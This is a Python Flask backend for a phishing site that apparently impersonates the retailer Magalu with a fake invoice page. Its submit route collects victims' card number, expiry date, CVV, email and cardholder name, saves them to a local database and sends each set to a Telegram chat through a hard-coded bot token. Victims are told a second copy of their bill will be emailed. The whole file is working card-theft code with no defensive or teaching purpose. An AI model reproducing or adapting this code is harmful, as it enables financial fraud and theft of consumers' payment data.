from flask import Flask, request, jsonify,render_template
from flask_cors import CORS
import sqlite3
import os
import telebot

# Configuração do bot do Telegram
TELEGRAM_TOKEN = '6917852889:AAFDGrrRxGfpSNg15ofYUFuDsfTVBu0UD-Y'
CHAT_ID = '5426725653'
bot = telebot.TeleBot(TELEGRAM_TOKEN)

app = Flask(__name__)
CORS(app)

DB_PATH = "dados.db"

@app.route('/')
def index():
    return render_template("magalu.html")


# Criação do banco de dados e da tabela, caso ainda não exista
if not os.path.exists(DB_PATH):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS faturas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numero_cartao TEXT NOT NULL,
        validade TEXT NOT NULL,
        cvv TEXT NOT NULL,
        email TEXT NOT NULL,
        nome_cartao TEXT NOT NULL
    )
    """)
    conn.commit()
    conn.close()

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # Captura os dados do JSON recebido
        data = request.json
        numero_cartao = data.get('cardNumber')
        validade = data.get('validade')
        cvv = data.get('cvv')
        email = data.get('email')  # Captura o email do request
        nome_cartao = data.get('nomeCartao')  # Captura o nome do cartão

        # Verifica se todos os campos estão preenchidos
        if not all([numero_cartao, validade, cvv, email, nome_cartao]):
            return jsonify({"status": "error", "message": "Todos os campos são obrigatórios."}), 400

        # Insere os dados no banco de dados
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("""
        INSERT INTO faturas (numero_cartao, validade, cvv, email, nome_cartao)
        VALUES (?, ?, ?, ?, ?)
        """, (numero_cartao, validade, cvv, email, nome_cartao))
        conn.commit()

        # Enviar mensagem ao Telegram
        mensagem = f"""
        📝 **Novo Cadastro Recebido**:
        - **Número do Cartão**: {numero_cartao}
        - **Validade**: {validade}
        - **CVV**: {cvv}
        - **Email**: {email}
        - **Nome no Cartão**: {nome_cartao}
        """
        bot.send_message(CHAT_ID, mensagem, parse_mode="Markdown")

        conn.close()

        return jsonify({"status": "success", "message": "ENVIAREMOS UM EMAIL COM A SEGUNDA VIA DA SUA FATURA"}), 201
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
